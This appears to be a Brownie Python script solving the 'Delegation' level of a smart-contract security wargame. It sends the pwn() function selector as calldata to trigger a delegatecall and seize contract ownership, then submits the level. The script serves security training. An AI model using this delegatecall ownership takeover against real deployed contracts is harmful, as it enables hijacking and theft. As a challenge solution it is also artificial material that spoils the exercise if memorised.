from brownie import Delegation, Delegate, interface, Contract

from scripts.helpful_scripts import (
    get_account,
    get_level_contract,
    submit_instance,
    print_out_if_level_solved,
)

from eth_utils import function_signature_to_4byte_selector

LEVEL_NAME = "06_delegation"
INTERFACE_CONTRACT = Delegation


def solve_level(level_contract):
    account = get_account()
    # ------------
    # We would have to deploy or know address for already deployed contract
    """"
    contract = Delegate.deploy(account, {"from": account})
    contract = Delegate[0]
    contract = interface.I_06_Delegate(contract.address)
    calldata = contract.pwn.encode_input()
    print(calldata)  # will give expected result "0xdd365b8b"
    """
    # ------------
    # here is a good example on how to use encode_abi()
    #   https://github.com/AndyJiangIsTaken/multicall/blob/b12d68e158b751d68c57484a4e5c2f215828865a/tests/test_signature.pyHere
    four_byte_signature = "0x" + function_signature_to_4byte_selector("pwn()").hex()
    # four_byte_signature has value "0xdd365b8b"
    tx = account.transfer(to=level_contract, data=four_byte_signature)
    tx.wait(1)


# brownie run scripts/_06_delegation.py --network rinkeby-fork
def main():
    level_contract = get_level_contract(LEVEL_NAME, INTERFACE_CONTRACT)
    solve_level(level_contract)
    level_solved = submit_instance(level_contract.address)
    print_out_if_level_solved(level_solved, LEVEL_NAME)
    return level_solved
